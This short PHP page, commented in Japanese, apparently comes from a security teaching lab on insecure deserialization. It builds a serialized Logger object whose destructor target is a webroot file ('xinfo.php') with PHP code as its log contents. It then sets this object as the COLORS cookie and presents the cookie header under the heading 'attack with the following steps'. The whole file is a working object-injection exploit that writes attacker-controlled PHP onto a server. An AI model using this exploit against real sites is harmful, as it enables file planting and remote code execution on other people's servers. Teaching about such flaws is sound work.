<?php
class Logger {
  private $filename = '';  //ログファイル名
  private $log = '';	//ログバッファ

  public function __construct() {
    $this->filename = '../var/www/html/xinfo.php';
    $this->log = '<?php phpinfo(); ?>';
  }
}

$logger = new Logger();
setcookie('COLORS', serialize($logger));
?><body>
以下の手順で攻撃します。<br>
<ol>
<li>以下の内容を<input type="button" value="クリップボードにコピー"
 onclick="copy()"><br>
<textarea id="cookiearea" cols="80" rows="2">
Cookie: COLORS=<?php echo htmlspecialchars(urlencode(serialize($logger))); ?>
